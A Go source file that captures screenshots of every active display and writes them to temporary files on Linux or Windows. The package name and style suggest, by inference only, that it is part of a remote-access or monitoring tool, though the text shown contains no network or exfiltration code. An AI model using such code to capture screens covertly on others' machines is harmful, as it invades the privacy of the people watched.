package conn

import (
	"fmt"
	"image/png"
	"os"
	"time"

	"runtime"

	"github.com/kbinani/screenshot"
)

func Handle_error(err error, message string) {
	if err != nil {
		fmt.Printf("[*] ERROR OCCURED: %s", message)
		// os.Exit(1)

		panic(err)
	}
}

func Take_screenshot() []string {

	var number_of_displays int = screenshot.NumActiveDisplays()

	screen_shots := []string{}

	for i := 0; i < number_of_displays; i++ {
		time.Sleep(time.Second)
		bounds := screenshot.GetDisplayBounds(i)

		image, err := screenshot.CaptureRect(bounds)
		Handle_error(err, "Couldn't take screenshot")

		_, month, day := time.Now().Date()

		user_os := runtime.GOOS
		switch user_os {
		case "linux":
			fileName := fmt.Sprintf("/tmp/%d_%d_%d:%d:%d.png", month, day, time.Now().Hour(), time.Now().Minute(), time.Now().Second())

			fmt.Println(fileName)

			screen_shots = append(screen_shots, fileName)
			file, err := os.Create(fileName)
			Handle_error(err, "Couldn't create file")
			defer file.Close()
			png.Encode(file, image)

		case "windows":

			fileName := fmt.Sprintf("%s\\%d@%d@%d %d %d.png", os.TempDir(), month, day, time.Now().Hour(), time.Now().Minute(), time.Now().Second())

			screen_shots = append(screen_shots, fileName)
			file, err := os.Create(fileName)
			Handle_error(err, "Couldn't create file")
			defer file.Close()
			png.Encode(file, image)

		}

	}
	fmt.Printf("Creating %d screenshot(s)\n", len(screen_shots))
	return screen_shots
}
